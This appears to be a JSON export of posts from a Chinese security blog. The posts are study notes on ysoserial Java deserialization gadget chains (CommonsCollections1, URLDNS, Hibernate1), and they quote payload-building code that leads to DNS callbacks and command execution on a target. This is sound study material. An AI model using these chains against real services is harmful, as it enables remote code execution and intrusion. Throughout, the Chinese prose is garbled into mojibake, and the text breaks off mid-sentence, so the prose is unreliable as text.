æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒæŒ‰ç†æ¥è¯´è¿™åº”è¯¥æ˜¯ç›®æ ‡æ–¹æ³•æ‰€åœ¨çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ Runtime å¯¹è±¡ã€‚\nè¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå½“ invoke è°ƒç”¨çš„ç›®æ ‡æ–¹æ³•æ˜¯é™æ€æ–¹æ³•æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°†æ— å…³ç´§è¦ï¼Œç›®æ ‡ç±»çš„ç›¸å…³ä¿¡æ¯å·²ç»åœ¨ä¹‹å‰çš„æ­¥éª¤è·å–äº†ã€‚\næ¯”å¦‚åœ¨ä¸Šé¢çš„æ‰§è¡Œæµç¨‹ä¸­ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨ InvokerTransformer#transform è·å– Runtime#getRuntime æ—¶çš„ input å˜é‡å°±æ˜¯ Runtime.class\nç¬¬ä¸‰æ¬¡è°ƒç”¨ InvokerTransformer#transformï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼š\nç°åœ¨æˆ‘ä»¬åªè¦è°ƒç”¨ ChainedTransformer#transformï¼Œå°±èƒ½æ‰§è¡Œæ¶æ„ä»£ç äº†ï¼Œå‰©ä¸‹çš„é—®é¢˜å°±æ˜¯æ€ä¹ˆè®©ç›®æ ‡è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•äº†ã€‚\nè§¦å‘ç‚¹ LazyMap æœŸæœ›ç›®æ ‡åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ç›´æ¥æ‰§è¡Œ ChainedTransformer#transform æ˜¯ä¸å¤ªç°å®çš„ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æ›´å¸¸è§„çš„æ“ä½œæ¥è§¦å‘è¿™ä¸€æ–¹æ³•ï¼Œæ¯”å¦‚ Map æ•°æ®ç»“æ„çš„ç›¸å…³æ“ä½œã€‚\næ­£å¥½ Commons Collections ä¸­æä¾›äº†ä¸¤ä¸ªç±»ï¼ŒTransformedMap å’Œ LazyMapã€‚å®ƒä»¬çš„ä½œç”¨æœ‰ç‚¹ç›¸ä¼¼ï¼Œéƒ½å¯ä»¥ä¿®é¥°ä¸€ä¸ª Map æ•°æ®ï¼Œå½“å¯¹è¯¥ Map æ•°æ®è¿›è¡Œæ“ä½œæ—¶ä¼šè§¦å‘ transform è¿‡ç¨‹ã€‚\nå› ä¸º ysoserial ä¸­ç”¨çš„æ˜¯ LazyMapï¼Œæ‰€ä»¥åªåˆ†æä¸€ä¸‹å®ƒçš„åˆ©ç”¨æ–¹æ³•ã€‚å®ƒçš„ get æ–¹æ³•å¦‚ä¸‹ï¼š\npublic Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } åœ¨ç¬¬ 3 è¡Œè°ƒç”¨äº†ä¸€ä¸ª transform æ–¹æ³•ï¼Œè€Œ this.factory å¯ä»¥åœ¨æ„é€ å‡½æ•°ä¸­èµ‹å€¼ï¼Œæˆ‘ä»¬å°†å®ƒè®¾ç½®ä¸º ChainedTransformer å¯¹è±¡ï¼Œç„¶åæƒ³åŠæ³•è§¦å‘è¿™ä¸ª get æ–¹æ³•ã€‚\nAnnotaionInvocationHandler AnnotaionInvocationHandler ç±»çš„ååºåˆ—è¿‡ç¨‹ä¸­æœ‰ Map çš„ç›¸å…³æ“ä½œï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥è§¦å‘ LazyMap#getã€‚æ³¨æ„ï¼Œåœ¨ JDK8 ä¹‹åå®ƒçš„ readObject æ–¹æ³•æ›´æ–°äº†(diff)ï¼Œä¸‹é¢çš„æ–¹æ³•å°±ç”¨ä¸äº†äº†ã€‚2\né¦–å…ˆçœ‹ä¸€ä¸‹ getObject æ–¹æ³•ä¸­çš„ä»£ç ï¼š\nçº¢æ¡†çš„ä»£ç åˆ©ç”¨äº†ä¸¤å±‚çš„åŠ¨æ€ä»£ç†æ¥å°è£… lazyMap å¯¹è±¡ï¼Œç›¸å…³æ–¹æ³•å¦‚ä¸‹ï¼š\nç¬¬ä¸€æ¬¡è°ƒç”¨ createMemoitizedProxy ç”Ÿæˆ mapProxy ä»£ç†å¯¹è±¡ï¼Œå°† lazyMap èµ‹ç»™å®ƒçš„ handler çš„ memberValues å±æ€§ã€‚\nç¬¬äºŒæ¬¡è°ƒç”¨ createMemoizedInvocationHandler ç”Ÿæˆ handler å¯¹è±¡ï¼Œå°† mapProxy èµ‹ç»™ memberValues å±æ€§ã€‚\nå…³ç³»å¤§è‡´å¦‚ä¸‹ï¼š\nhandler.memberValues == mapProxy mapProxy.handler.memberValues == lazyMap ååºåˆ—åŒ– æœ€åçœ‹ä¸€çœ‹ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯ AnnotaionInvocationHandler#readObject çš„æ‰§è¡Œæµç¨‹ã€‚\nè¿™æ—¶çš„ this.memberValues æ˜¯ mapProxy ä»£ç†å¯¹è±¡ï¼Œè°ƒç”¨å®ƒçš„ entrySet æ–¹æ³•ä¼šæ‰§è¡Œå…¶ handler çš„ invoke æ–¹æ³•ã€‚\næ¥åˆ° AnnotationInvocationHandler#invokeï¼Œæ³¨æ„è¿™æ—¶çš„ this å’Œä¹‹å‰æ˜¯ä¸åŒå®ä¾‹äº†ï¼Œè€Œ this.memberValues å°±æ˜¯ lazyMap å¯¹è±¡ã€‚\nå¯ä»¥çœ‹åˆ°åœ¨ invoke æ–¹æ³•è¿™è°ƒç”¨äº† lazyMap#getï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚\nhttps://xz.aliyun.com/t/7031\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://juejin.cn/post/6844903997011132423\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2021-03-02","permalink":"https://zrquan.github.io/posts/ysoserial-cc1/","tags":["java","deserialize"],"title":"Ysoserial-CommonsCollections1"},{"content":"URLDNS æ˜¯ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„ POP é“¾ï¼Œè€Œä¸”åªèƒ½å‘é€ DNS è¯·æ±‚ï¼Œä¸èƒ½ç›´æ¥ RCEï¼Œæ‰€ä»¥æœ¬æ¥æ˜¯ä¸æƒ³å†™è¿™ç¯‡æ–‡ç« çš„ã€‚ä¸è¿‡å®Œæ•´å­¦ä¹ äº†è¿™ä¸ªé“¾çš„ä»£ç åï¼Œå‘ç° ysoserial çš„ä¸€äº›ä»£ç å’ŒæŠ€å·§å¯¹äºæ·±å…¥äº†è§£ Java ååˆ†æœ‰å¸®åŠ©ï¼Œè¿˜æ˜¯æœ‰å¿…è¦è®°å½•ä¸€ä¸‹ã€‚\næ„é€  payload URLDNS é“¾é€šè¿‡ååºåˆ—åŒ– HashMap å¯¹è±¡æ¥è§¦å‘ï¼Œè·å–æ¶æ„å¯¹è±¡çš„ getObject æ–¹æ³•å¦‚ä¸‹ï¼š\npublic Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. //During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. Reflections.setFieldValue(u, \u0026quot;hashCode\u0026quot;, -1); return ht; } SilentURLStreamHandler æ˜¯ä¸€ä¸ªé™æ€å†…éƒ¨ç±»ï¼Œç»§æ‰¿ URLStreamHandlerï¼Œå¹¶é‡å†™äº† openConnection å’Œ getHostAddress æ–¹æ³•ã€‚\nstatic class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } è¿™ä¸ªå†…éƒ¨ç±»çš„ä½œç”¨æ˜¯ç”¨æ¥é¿å…æ¼æ´è¯¯åˆ¤ï¼Œå› ä¸º payload çš„æ„é€ è¿‡ç¨‹ä¸­ä¹Ÿä¼šè§¦å‘ä¸€æ¬¡ DNS è¯·æ±‚ï¼Œè€Œæˆ‘ä»¬å¸Œæœ› DNS è¯·æ±‚åªåœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è§¦å‘ï¼Œä»¥ç¡®å®šååºåˆ—åŒ–è¿‡ç¨‹æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚\né‚£ SilentURLStreamHandler æ˜¯æ€ä¹ˆé˜»æ­¢ç¬¬ä¸€æ¬¡ DNS è¯·æ±‚çš„å‘¢ï¼Ÿæˆ‘ä»¬è·Ÿè¿›åˆ° ht.put(u, url) ä¸­ï¼š\næ¥åˆ° hashCode() æ–¹æ³•ï¼Œè¿™é‡Œä¼šå¯¹ hashCode å˜é‡è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸æ˜¯ -1 çš„è¯ä¼šç›´æ¥è¿”å›ã€‚å› ä¸º hashCode çš„é»˜è®¤å€¼å°±æ˜¯ -1 ï¼Œæ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨ handler.hashCode(this) ã€‚\næ³¨æ„æ­¤æ—¶çš„ handler æ˜¯ SilentURLStreamHandler çš„å®ä¾‹ã€‚\næ‰§è¡Œåˆ°ä¸Šå›¾çš„ 359 è¡Œï¼Œè°ƒç”¨ getHostAddress æ–¹æ³•ï¼Œå¦‚æœæ­¤æ—¶çš„ handler æ˜¯ URLStreamHandler ç±»çš„å®ä¾‹ï¼Œåˆ™ä¼šå‘èµ· DNS è¯·æ±‚æ¥è·å– IPã€‚\nç„¶è€Œæ­¤æ—¶æ‰§è¡Œçš„æ˜¯ SilentURLStreamHandler.getHostAddress ï¼Œç›´æ¥è¿”å› nullï¼Œé¿å…äº†åœ¨ååºåˆ—åŒ–å‰å‘é€ DNS è¯·æ±‚ã€‚\næ‰§è¡Œ ht.put(u, url) ä¹‹åï¼ŒURL å¯¹è±¡çš„ hashcode ä¼šè¢«ä¿®æ”¹ï¼Œå‰é¢è¯´è¿‡å¦‚æœ hashCode ä¸æ˜¯-1ï¼Œä¼šåœ¨ handler.hashCode(this) å‰è¿”å›ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°†å®ƒé‡æ–°è®¾æˆ-1ã€‚\nè‡³æ­¤æˆ‘ä»¬æ„é€ äº†ä¸€ä¸ª HashMap çš„å®ä¾‹ï¼Œå¹¶å°†ä¸€ä¸ª URL ç±»çš„å®ä¾‹è®¾ç½®ä¸ºå®ƒçš„ keyï¼›value åˆ™æ˜¯æˆ‘ä»¬è¾“å…¥çš„ urlï¼Œå®é™…ä¸Š value å¯¹åˆ©ç”¨è¿‡ç¨‹æ²¡æœ‰å½±å“ï¼Œåªè¦æ˜¯èƒ½è¢«åºåˆ—åŒ–çš„ç±»å°±è¡Œã€‚\nååºåˆ—åŒ–è¿‡ç¨‹ å…¥å£ç‚¹å’Œ Hibernate1 é“¾ä¸€æ ·ï¼Œåœ¨ HashMap.readObject ä¸­ã€‚åœ¨æ–¹æ³•çš„æœ€åï¼Œé€šè¿‡ for å¾ªç¯è·å–æ¯ä¸ª key å’Œ valueï¼Œå¹¶è°ƒç”¨äº† hash() ï¼š\næ¥ä¸‹æ¥çš„æ‰§è¡Œè¿‡ç¨‹å’Œå‰é¢ ht.put(u, url) å·®ä¸å¤šï¼Œå› ä¸ºå‰é¢é€šè¿‡åå°„æœºåˆ¶é‡ç½®äº† hashCodeï¼Œæ‰€ä»¥ä»ç„¶è¿›å…¥åˆ° handler.hashCode() ä¸­ã€‚\nå’Œä¹‹å‰ä¸€æ ·æ‰§è¡Œåˆ° getHostAddress æ–¹æ³•ï¼Œä½†è¿™æ¬¡çš„ handler å¹¶ä¸æ˜¯ SilentURLStreamHandler çš„å®ä¾‹ï¼Œå› æ­¤é¡ºåˆ©å‘é€ DNS è¯·æ±‚ã€‚\ntransient å…³é”®å­— ååºåˆ—åŒ–æ—¶ï¼Œhandler å˜é‡å¹¶ä¸æ˜¯ SilentURLStreamHandler çš„å®ä¾‹ï¼Œæ˜¯å› ä¸º URL.handler å˜é‡æ˜¯ç”¨ transient å…³é”®å­—ä¿®é¥°çš„ã€‚\nå½“åºåˆ—åŒ–ä¸€ä¸ªå®ç°äº† Serilizable æ¥å£çš„ç±»å®ä¾‹æ—¶ï¼Œç”¨ transient ä¿®é¥°çš„å˜é‡ä¸ä¼šè¢«åºåˆ—åŒ–ã€‚åœ¨å®é™…çš„å¼€å‘ä¸­ï¼Œç»å¸¸ä¼šç”¨ transient ä¿®é¥°ä¸€äº›æ•æ„Ÿçš„æ•°æ®(å¯†ç ã€è¯ä»¶å·ç­‰)ï¼Œé¿å…å°†è¿™äº›æ•°æ®åºåˆ—åŒ–åé€šè¿‡ç½‘ç»œä¼ è¾“ã€‚\nä»¥ä¸‹ç¤ºä¾‹ä»£ç ä½¿ç”¨ transient ä¿®é¥° User ç±»çš„ password å˜é‡ï¼Œåºåˆ—åŒ–ä¿å­˜åˆ°æ–‡ä»¶åå†ååºåˆ—åŒ–è·å– User å®ä¾‹ï¼Œæ­¤æ—¶è¾“å‡ºçš„ password ä¸º nullï¼Œå› ä¸ºè¯¥å˜é‡æ²¡æœ‰è¢«åºåˆ—åŒ–ã€‚\nç¤ºä¾‹ä»£ç  public class demo { public static void main(String[] args) { User user = new User(); user.setName(\u0026quot;zrquan\u0026quot;); user.setPassword(\u0026quot;qwe123\u0026quot;); //åºåˆ—åŒ– try{ ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream(\u0026quot;user.txt\u0026quot;)); os.writeObject(user); os.flush(); os.close(); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } //ååºåˆ—åŒ– try{ ObjectInputStream is = new ObjectInputStream(new FileInputStream(\u0026quot;user.txt\u0026quot;)); user = (User) is.readObject(); is.close(); System.out.println(\u0026quot;After deserialized: \u0026quot;); System.out.println(\u0026quot;username: \u0026quot; + user.getName()); System.err.println(\u0026quot;password: \u0026quot; + user.getPassword()); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } catch (ClassNotFoundException e) { e.printStackTrace(); } } } class User implements Serializable { public String name; private transient String password; public String getName() { return name; } public void setName(String name) { this.name = name; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } } ğŸ’¡ ä½¿ç”¨ transient è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š\nè¢«ä¿®é¥°çš„å˜é‡å°†ä¸å†æ˜¯å¯¹è±¡æŒä¹…åŒ–çš„ä¸€éƒ¨åˆ†ï¼Œè¯¥å˜é‡çš„å€¼åœ¨åºåˆ—åŒ–åæ— æ³•è·å–ã€‚ åªèƒ½ä¿®é¥°å˜é‡ï¼Œä¸èƒ½ä¿®é¥°æ–¹æ³•å’Œç±»ã€‚ä¸”æœ¬åœ°å˜é‡ä¸èƒ½è¢«ä¿®é¥°ï¼Œåªèƒ½ä¿®é¥°å®ç°äº† Serializable æ¥å£çš„ç±»çš„æˆå‘˜å˜é‡ã€‚ é™æ€å˜é‡ä¸ç®¡æ˜¯å¦è¢« transient ä¿®é¥°ï¼Œéƒ½ä¸èƒ½è¢«åºåˆ—åŒ–ã€‚ transient ç”¨æ¥é¿å…å®ç°äº† Serilizable æ¥å£çš„ç±»çš„å˜é‡è¢«åºåˆ—åŒ–ï¼Œå¯¹å®ç° Externalizable æ¥å£çš„ç±»æ²¡æœ‰å½±å“ã€‚ ","date":"2021-01-28","permalink":"https://zrquan.github.io/posts/ysoserial-urldns/","tags":["java","deserialize"],"title":"Ysoserial-URLDNS"},{"content":"Hibernate æ˜¯ Java çš„ä¸€ä¸ªå¯¹è±¡å…³ç³»æ˜ å°„(ORM)æ¡†æ¶ï¼Œä½¿ç”¨ GNU å¼€æºåè®®ã€‚è¯¥åˆ©ç”¨é“¾ä»¥ HashMap ä¸ºå…¥å£ç‚¹ï¼Œé€šè¿‡ hibernate-core åŒ…ä¸­çš„å¤šä¸ªç±»åŠå…¶æ–¹æ³•æ„æˆè°ƒç”¨è·¯å¾„ï¼Œæœ€ç»ˆæ‰§è¡Œäº‹å…ˆå†™å…¥åˆ° TemplatesImpl ç±»ä¸­çš„å‘½ä»¤ã€‚\nåŠ¨æ€å­—èŠ‚ç  ysoserial åœ¨æ„é€  payload æ—¶ï¼Œåˆ©ç”¨äº† Java çš„åŠ¨æ€å­—èŠ‚ç ç”Ÿæˆçš„æŠ€æœ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆç¨å¾®äº†è§£ä¸€ä¸‹ã€‚\nä¼—æ‰€å‘¨çŸ¥ï¼ŒJava æ˜¯ä¸€é—¨éœ€è¦ç¼–è¯‘çš„è¯­è¨€ï¼ŒJVM è¯»å–å¹¶è¿è¡Œçš„æ˜¯ç¼–è¯‘åçš„ .class å­—èŠ‚ç æ–‡ä»¶ã€‚ä½†æœ‰æ—¶å€™æˆ‘ä»¬æƒ³è¦åœ¨ç¨‹åºè¿è¡Œä¸­åŠ¨æ€ä¿®æ”¹ä¸€äº›ä»£ç ï¼Œæ¯”å¦‚çƒ­è¡¥ä¸ã€æ¥å£å‡çº§ã€IDE åœ¨è°ƒè¯•æ—¶è¯»å–æˆ–ä¿®æ”¹å˜é‡ç­‰ç­‰éœ€æ±‚ã€‚å¦‚æœæ¯æ¬¡éƒ½è¦æŠŠç¨‹åºåœæ‰å†é‡æ–°ç¼–è¯‘ï¼Œæ˜¾ç„¶ä¸å¤ªç°å®ï¼Œè€Œé€šè¿‡ Java åŠ¨æ€å­—èŠ‚ç æŠ€æœ¯ï¼Œå°±å¯ä»¥ç›´æ¥ä¿®æ”¹å­—èŠ‚ç æ–‡ä»¶ï¼Œå†é€šè¿‡ç›¸å…³æ¥å£åŠ è½½åˆ° JVM ä¸­ï¼Œå®ç°è¿è¡Œæ—¶çš„ä»£ç ä¿®æ”¹ã€‚\nå¸¸è§çš„åŠ¨æ€å­—èŠ‚ç ä¿®æ”¹æœ‰ä¸¤ç§æ–¹å¼ï¼š\nASMï¼Œå¯ä»¥ç›´æ¥æ“ä½œå­—èŠ‚ç ï¼Œæ‰§è¡Œæ•ˆç‡é«˜ï¼Œç›¸å¯¹çš„é—¨æ§›ä¹Ÿæ¯”è¾ƒé«˜ï¼Œéœ€è¦å¯¹ Java çš„å­—èŠ‚ç æ–‡ä»¶æœ‰æ‰€äº†è§£ï¼Œç†Ÿæ‚‰ JVM çš„ç¼–è¯‘æŒ‡ä»¤ã€‚ Javassitï¼Œç”±ä¸œäº¬æŠ€æœ¯å­¦é™¢çš„ Shigeru Chiba åˆ›ä½œçš„å¼€æºç±»åº“ï¼Œæä¾›äº†æ›´æŠ½è±¡çš„ API æ¥å¯¹å­—èŠ‚ç è¿›è¡Œæ“ä½œã€‚Hibernate1 åˆ©ç”¨é“¾ä¸­ä¹Ÿæ­£æ˜¯ä½¿ç”¨è¿™ä¸ªç±»åº“æ¥æ„é€  payloadã€‚ Javassit demo ä¸‹é¢çš„ç¤ºä¾‹ä»£ç é€šè¿‡ Javassit æ„é€ äº†ä¸€ä¸ª Someone ç±»ï¼Œå¹¶æ·»åŠ äº†æ–¹æ³•å’Œå±æ€§ã€‚ç„¶åå°†è¯¥ç±»å®ä¾‹åŒ–ï¼Œå¹¶è°ƒç”¨å…¶ toString æ–¹æ³•ã€‚\nç¤ºä¾‹ä»£ç  import javassist.*; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class demo { public static void main(String[] args) { ClassPool classPool = ClassPool.getDefault(); //å®šä¹‰Someoneç±» CtClass ccSomeone = classPool.makeClass(\u0026quot;Someone\u0026quot;); try { //å®šä¹‰æˆå‘˜å˜é‡name CtClass fieldType = classPool.get(\u0026quot;java.lang.String\u0026quot;); CtField cfName = new CtField(fieldType, \u0026quot;name\u0026quot;, ccSomeone); cfName.setModifiers(Modifier.PRIVATE); //ç”¨privateä¿®é¥°name ccSomeone.addField(cfName, CtField.Initializer.constant(\u0026quot;init\u0026quot;)); //æ·»åŠ nameåˆ°Someoneä¸­ï¼Œåˆå§‹å€¼ä¸ºinit //å®šä¹‰æ„é€ æ–¹æ³• CtClass[] parameters = new CtClass[]{classPool.get(\u0026quot;java.lang.String\u0026quot;)}; //å‚æ•°ä¸ºStringç±»å‹ CtConstructor constructor = new CtConstructor(parameters, ccSomeone); String body = \u0026quot;{this.name=$1;}\u0026quot;; //æ–¹æ³•ä½“ï¼Œ$1è¡¨ç¤ºçš„ç¬¬ä¸€ä¸ªå‚æ•° constructor.setBody(body); ccSomeone.addConstructor(constructor); //è®¾ç½®ä¸ºSomeoneçš„æ„é€ æ–¹æ³• //setNameå’ŒgetNameæ–¹æ³• ccSomeone.addMethod(CtNewMethod.setter(\u0026quot;setName\u0026quot;,cfName)); ccSomeone.addMethod(CtNewMethod.getter(\u0026quot;getName\u0026quot;,cfName)); //toString æ–¹æ³• CtClass returnType = classPool.get(\u0026quot;java.lang.String\u0026quot;); //è¿”å›ç±»å‹ä¸º String String methodName = \u0026quot;toString\u0026quot;; CtMethod cmToString = new CtMethod(returnType, methodName, null, ccSomeone); cmToString.setModifiers(Modifier.PUBLIC); //ç”¨ public ä¿®é¥° String methodBody = \u0026quot;{return \\\u0026quot;My name is \\\u0026quot;+$0.name;}\u0026quot;; //æ–¹æ³•ä½“ï¼Œ$0 è¡¨ç¤º this cmToString.setBody(methodBody); ccSomeone.addMethod(cmToString); //è·å– Someone ç±»çš„å®ä¾‹ï¼Œè®¾ç½® name å±æ€§ï¼Œè°ƒç”¨ toString æ–¹æ³• Class clazz = ccSomeone.toClass(); Constructor cons = clazz.getConstructor(String.class); Object someone = cons.newInstance(\u0026quot;zrquan\u0026quot;); //é€šè¿‡æ„é€ æ–¹æ³•è®¾ç½® name Method toString = clazz.getMethod(\u0026quot;toString\u0026quot;); System.out.println(toString.invoke(someone)); } catch (NotFoundException | CannotCompileException | NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } } } æ„é€  payload æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹æœ€ä¸»è¦çš„ getObject æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å®Œæˆäº†å¯¹è¦æ‰§è¡Œçš„å‘½ä»¤çš„â€œåŒ…è£…â€ï¼Œå¹¶è¿”å›åŒ…å«è¯¥å‘½ä»¤çš„å¯¹è±¡ã€‚\npublic Object getObject ( String command ) throws Exception { Object tpl = Gadgets.createTemplatesImpl(command); Object getters = makeGetter(tpl.getClass(), \u0026quot;getOutputProperties\u0026quot;); return makeCaller(tpl, getters); } å…¶ä¸­ makeGetter å’Œ makeCaller éƒ½æ˜¯å†…éƒ¨å‡½æ•°ï¼Œè€Œ makeGetter å…¶å®åªèµ·åˆ°è·¯ç”±ä½œç”¨ï¼ŒçœŸæ­£çš„é€»è¾‘ä»£ç åœ¨å†…éƒ¨å‡½æ•° makeHibernate4Getter å’Œ makeHibernate5Getter ä¸­ã€‚\né¦–å…ˆè·Ÿè¿›ä¸€ä¸‹ createTemplatesImpl æ–¹æ³•ï¼š\nè¯¥æ–¹æ³•å…ˆå¯¹ç³»ç»Ÿå±æ€§ properXalan è¿›è¡Œäº†åˆ¤æ–­â€”â€”å¦‚æœè¿”å› falseï¼Œåˆ™é€šè¿‡åå°„æœºåˆ¶è·å– TemplatesImplã€AbstractTransletã€TransformerFactoryImpl ä¸‰ä¸ªç±»çš„å…¨å±€é™å®šç±»åï¼Œå°†å…¶ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨é‡è½½çš„ createTemplatesImpl æ–¹æ³•ï¼›å¦‚æœè¿”å› trueï¼Œå°±ä½¿ç”¨ä¸Šè¿°ä¸‰ä¸ªç±»çš„éå…¨å±€é™å®šç±»åä½œä¸ºå‚æ•°è°ƒç”¨é‡è½½æ–¹æ³•ã€‚\nåœ¨é‡è½½çš„ createTemplatesImpl æ–¹æ³•ä¸­ï¼Œé€šè¿‡ Javassit åº“åˆ›å»ºä¸€ä¸ª StubTransletPayload ç±»ï¼Œå¹¶å°†æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤æ·»åŠ åˆ°è¿™ä¸ªç±»çš„é™æ€ä»£ç å—ï¼Œå½“è¿™ä¸ªç±»è¢«åŠ è½½æ—¶ï¼Œæˆ‘ä»¬å†™å…¥çš„å‘½ä»¤å°±ä¼šæ‰§è¡Œã€‚\nå¯ä»¥çœ‹åˆ°åœ¨ 116 è¡Œï¼Œè°ƒç”¨ CtClass.makeClassInitializer() åˆ›å»ºä¸€ä¸ªç©ºçš„é™æ€ä»£ç å—ï¼Œå†é€šè¿‡ insertAfter() å°†å‘½ä»¤æ’å…¥åˆ°é™æ€ä»£ç å—æœ«å°¾ã€‚\nä»£ç çš„ 119 å’Œ 120 è¡Œç»™ StubTransletPayload è®¾ç½®äº†çˆ¶ç±» AbstractTransletï¼Œä½†å…¶å®æ²¡æœ‰å¿…è¦ï¼Œå› ä¸º StubTransletPayload æœ¬èº«å°±ç»§æ‰¿äº† AbstractTransletã€‚\næ–¹æ³•çš„æœ€åå°† StubTransletPayload å®ä¾‹è½¬æ¢æˆ byte æ•°ç»„ï¼Œèµ‹ç»™ templates å˜é‡çš„ _bytecodes å±æ€§ï¼Œå¹¶è®¾ç½®äº† _name å’Œ _tfactory å±æ€§ã€‚\nè¿”å›çš„ templates å˜é‡æ˜¯ TemplatesImpl ç±»çš„å®ä¾‹ï¼Œæ‰§è¡Œå®Œ createTemplatesImpl åï¼Œå®ƒçš„ç»“æ„å¤§è‡´å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\næ¥ä¸‹æ¥æ‰§è¡Œçš„ä»£ç æ˜¯ makeGetter æ–¹æ³•ï¼š\nObject getters = makeGetter(tpl.getClass(), \u0026quot;getOutputProperties\u0026quot;); é¦–å…ˆé€šè¿‡ç³»ç»Ÿå±æ€§åˆ¤æ–­å½“å‰çš„ hibernate ç‰ˆæœ¬ï¼Œysoserial ä½¿ç”¨çš„æ˜¯ 4.3 ç‰ˆæœ¬ï¼Œæ‰€ä»¥ç›´æ¥è·³åˆ° makeHibernate4Getter å‡½æ•°ã€‚\nè¿™ä¸€éƒ¨åˆ†æ¯”è¾ƒç®€å•ï¼Œé€šè¿‡åå°„æœºåˆ¶åˆ›å»ºäº†ä¸€ä¸ª BasicPropertyAccessor$BasicGetter å®ä¾‹ï¼Œå¹¶èµ‹å€¼äº† clazzã€methodã€propertyName å±æ€§ï¼Œç„¶åæ”¾åˆ° Getter æ•°ç»„ä¸­ã€‚ç±»å›¾å¤§è‡´å¦‚ä¸‹ï¼š\næœ€åæ‰§è¡Œçš„æ˜¯ makeCaller(tpl, getters) ï¼Œé€šè¿‡åå°„æœºåˆ¶è¿›è¡Œä¸€ç³»åˆ—ç”Ÿæˆå®ä¾‹ã€èµ‹å€¼å±æ€§çš„æ“ä½œï¼Œç„¶åè¿”å›ä¸€ä¸ª HashMap å¯¹è±¡ã€‚\nReflections ç±»å°è£…äº†ä¸€äº›åå°„æœºåˆ¶çš„æ“ä½œï¼Œæ³¨æ„åˆ°ç”Ÿæˆ PojoComponentTuplizer å®ä¾‹æ—¶è°ƒç”¨çš„æ˜¯ createWithoutConstructor æ–¹æ³•ï¼Œå®é™…ä¸Šä¼šä½¿ç”¨ Object ç±»çš„æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥å®ä¾‹ä¸­çš„å±æ€§åŸºæœ¬éƒ½æ˜¯ nullã€‚æ¥ç€å°†ä¹‹å‰æ„é€ çš„ BasicPropertyAccessor$BasicGetter èµ‹å€¼ç»™ getters å±æ€§ã€‚\nç”Ÿæˆ ComponentType å®ä¾‹æ—¶ï¼Œä½¿ç”¨çš„æ˜¯å…¶çˆ¶ç±» AbstractType çš„é»˜è®¤æ„é€ æ–¹æ³•ï¼Œç„¶åèµ‹å€¼äº† componentTuplizerã€propertySpanã€propertyTypes ä¸‰ä¸ªå±æ€§ã€‚\nGadgets.makeMap(v1, v2) å°†ä¸¤ä¸ªç›¸åŒçš„ TypedValue å®ä¾‹å†™å…¥åˆ° HashMap ä¸­ï¼Œpayload çš„æ„é€ åˆ°æ­¤å°±å®Œæˆäº†ï¼Œå½“ç›®æ ‡åº”ç”¨ååºåˆ—åŒ–è¿™ä¸ª HashMap å¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬å†™å…¥çš„å‘½ä»¤å°±ä¼šæ‰§è¡Œã€‚\nHashMap çš„ç±»å›¾å¤§è‡´å¦‚ä¸‹ï¼š\nååºåˆ—åŒ–è¿‡ç¨‹ ä½¿ç”¨ jdk ååºåˆ—åŒ– HashMap å¯¹è±¡ï¼Œè‡ªç„¶ä¼šè°ƒç”¨å…¶ readObject æ–¹æ³•ï¼Œæ‰€ä»¥ä»¥è¯¥æ–¹æ³•ä½œä¸ºå…¥å£ç‚¹ï¼Œè°ƒè¯•åˆ†æ HashMap å¯¹è±¡ååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚\nå¦‚ä¸‹å›¾ï¼Œåœ¨ readObject æ–¹æ³•ä¸­ï¼Œå±€éƒ¨å˜é‡ mappings 